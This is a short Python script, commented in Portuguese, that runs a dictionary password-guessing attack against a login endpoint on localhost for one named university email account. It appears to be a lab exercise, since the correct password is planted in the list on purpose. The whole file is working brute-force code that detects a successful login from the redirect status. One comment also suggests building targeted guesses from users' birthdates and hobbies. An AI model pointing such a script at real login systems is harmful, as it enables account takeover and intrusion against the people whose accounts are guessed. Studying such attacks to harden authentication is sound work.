import time
import requests

BASE_URL = "http://127.0.0.1:5000"
TARGET_EMAIL = "sspark@universidade.br"

# Dicionario de senhas candidatas, respeitando a politica do sistema
# (4 a 8 caracteres, pelo menos 1 maiuscula e 1 simbolo entre @ # $ &)
# Aqui eu poderia fazer um ataque exaustivo explorando todo o espaço, mas é inviável
# Se eu tivesse informações pessoais dos usuários, como datas de nascimento, pessoas
# importantes, hobbies etc eu exploraria elas em um ataque mais direcionado
PASSWORD_LIST = [
    "Senh@123",
    "Admin#0o0",
    "Prof$123",
    "Unidin@1",
    "Teste#28",
    "Mar1ng@",
    "Aluno#67",
    "s$A159cc", # senha correta só para dar certo
]

def tentar_login(email, password):
    resp = requests.get(f"{BASE_URL}/login", params={
        "email": email,
        "password": password
    }, allow_redirects=False)
    # Login bem-sucedido redireciona (302); falha retorna a propria pagina (200)
    return resp.status_code == 302

def ataque_dicionario():
    inicio = time.time()
    for tentativa, senha in enumerate(PASSWORD_LIST, start=1):
        print(f"[{tentativa}/{len(PASSWORD_LIST)}] Testando senha: {senha}")
        if tentar_login(TARGET_EMAIL, senha):
            duracao = time.time() - inicio
            print(f"\nSenha encontrada: '{senha}'")
            print(f"Tempo total do ataque: {duracao:.2f} segundos")
            print(f"Tentativas realizadas: {tentativa}")
            return senha
    print("\nNenhuma senha do dicionario funcionou.")
    return None

if __name__ == "__main__":
    ataque_dicionario()